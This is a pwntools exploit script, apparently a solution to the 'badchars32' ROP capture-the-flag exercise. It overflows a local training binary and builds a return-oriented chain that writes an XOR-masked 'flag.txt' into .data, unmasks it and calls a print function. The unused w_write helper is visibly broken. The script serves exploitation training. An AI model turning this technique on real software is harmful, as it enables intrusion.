#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time
import sys

# break apres le read dans pwnme
gs='''
b *pwnme+273
c
'''

# Gadgets 
# mov dword ptr [edi], esi ; ret
g_write_edi=0x0804854f

# xor byte ptr [ebp], bl ; ret
g_xor_ebp = 0x08048547

# pop esi ; pop edi ; pop ebp ; ret
g_pop_esiediebp = 0x080485b9

# pop ebp ; ret
g_pop_ebp = 0x080485bb

#  pop ebx ; ret
g_pop_ebx = 0x0804839d

# RFU
def w_write(addr, data):
    r=b""
    if type(data) == str:
        data=data.encode()
    for i in range(0,len(data),8):
        r += p32(g_pop_esiediebp)
        r += p32(addr)
        r += data[i:i+8]
        r += p64(0)         ; ebp
        r += p64(g_write_edi)
    return r

def xorchain(chain, bytes, mask):
    r=b""
    for i,c in enumerate(chain):
        if bytes&0x80:
            c=c^mask
        r+=chr(c).encode()
        bytes= bytes<<1
    return r

# Offset avant ecrasement de l'adresse de retour
offset=0x2c

# Set up pwntools for the correct architecture
elf =  ELF('badchars32')
context.binary=elf

#print_file=elf.plt['print_file']
print_file=elf.symbols['usefulFunction']+14

data = elf.get_section_by_name('.data').header['sh_addr']

flagxored = xorchain(b"flag.txt",0b00111010,3)

log.info(f"{data=:x}")
log.info(f"flag xored :" + flagxored.decode())

PL =b"A"*offset
# On ecrit "fl__" dans data
PL+=p32(g_pop_esiediebp)
PL+=flagxored[:4]
PL+=p32(data)
PL+=p32(0)              # ebp
PL+=p32(g_write_edi)

# On ecrit "
PL+=p32(g_pop_esiediebp)
PL+=flagxored[4:8]
PL+=p32(data+4)
PL+=p32(0)              # ebp
PL+=p32(g_write_edi)

# data+2 xor 3
PL+=p32(g_pop_ebp)
PL+=p32(data+2)
PL+=p32(g_pop_ebx)
PL+=p32(3)              
PL+=p32(g_xor_ebp)

# data+3 xor 3 
# bl ne change pas
PL+=p32(g_pop_ebp)
PL+=p32(data+3)
PL+=p32(g_xor_ebp)

# data+4 xor 3 
PL+=p32(g_pop_ebp)
PL+=p32(data+4)
PL+=p32(g_xor_ebp)

# data+6 xor 3 
PL+=p32(g_pop_ebp)
PL+=p32(data+6)
PL+=p32(g_xor_ebp)

# Appel de print_file
PL+=p32(print_file)
PL+=p32(data)

io = process([elf.path])
if len(sys.argv)>1 and sys.argv[1] == "-d":
    gdb.attach(io,gs)
    time.sleep(1)
    #io = gdb.debug([elf.path],gdbscript=gs)

# io.recvuntil(b"> ")
io.sendline(PL)
io.interactive()

